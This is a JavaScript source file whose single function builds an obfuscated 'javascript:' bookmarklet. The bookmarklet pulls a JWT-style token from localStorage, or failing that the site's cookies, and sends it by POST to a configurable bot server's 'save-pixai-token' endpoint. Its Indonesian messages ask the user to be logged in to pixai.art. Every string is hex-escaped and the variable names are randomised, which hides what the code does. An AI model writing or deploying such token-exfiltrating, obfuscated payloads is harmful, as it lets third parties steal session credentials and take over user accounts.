function generatePayload(botUrl, nonce) {
    function toHex(str) { return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }

    // Obfuscate simple keys
    const _localStorage = toHex('localStorage');
    const _entries = toHex('entries');
    const _find = toHex('find');
    const _includes = toHex('includes');
    const _replace = toHex('replace');
    const _getItem = toHex('getItem');
    const _cookie = toHex('cookie');
    const _token = toHex('token');
    const _eyJ = toHex('eyJ');
    
    // Obfuscate fetch keys
    const _fetch = toHex('fetch');
    const _POST = toHex('POST');
    const _contentType = toHex('Content-Type');
    const _appJson = toHex('application/json');
    const _stringify = toHex('stringify');
    const _then = toHex('then');
    const _catch = toHex('catch');
    const _json = toHex('json');
    const _message = toHex('message');
    const _alert = toHex('alert');
    const _prompt = toHex('prompt');

    const v1 = '_0x' + Math.random().toString(16).substring(2, 8); // Token variable
    const v2 = '_0x' + Math.random().toString(16).substring(2, 8);
    const v3 = '_0x' + Math.random().toString(16).substring(2, 8);

    // Build Payload
    const payload = `javascript:(function(){
        let ${v1} = Object['${_entries}'](window['${_localStorage}'])['${_find}'](([${v2},${v3}])=>${v3}['${_includes}']('${_eyJ}'))?.[1]?.['${_replace}'](/^"|"$/g,'') || window['${_localStorage}']['${_getItem}']('${_token}') || document['${_cookie}'];
        
        if(${v1}) {
            window['${_fetch}']('${botUrl}/api/save-pixai-token', {
                method: '${_POST}',
                headers: { '${_contentType}': '${_appJson}' },
                body: JSON['${_stringify}']({ token: ${v1}, nonce: '${nonce}' })
            })['${_then}'](r => r['${_json}']())['${_then}'](d => {
                window['${_alert}'](d['${_message}']);
            })['${_catch}'](e => {
                window['${_prompt}']('${toHex('Pengiriman otomatis gagal (CORS/Network). Salin token lalu paste di Opsi B:')}', ${v1});
            });
        } else {
            window['${_alert}']('${toHex('Token tidak ditemukan. Pastikan Anda sudah login di pixai.art')}');
        }
    })()`.replace(/\s+/g, '');

    return payload;
}

console.log(generatePayload('http://localhost:3000', 'NONCE_123'));
